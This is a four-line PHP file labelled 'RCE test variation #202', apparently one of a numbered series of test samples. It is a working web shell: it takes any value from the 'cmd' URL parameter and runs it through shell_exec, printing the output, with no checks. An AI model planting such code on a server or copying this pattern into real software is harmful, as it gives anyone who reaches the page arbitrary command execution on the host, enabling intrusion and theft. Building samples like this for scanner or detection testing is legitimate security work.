<?php
// RCE test variation #202
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>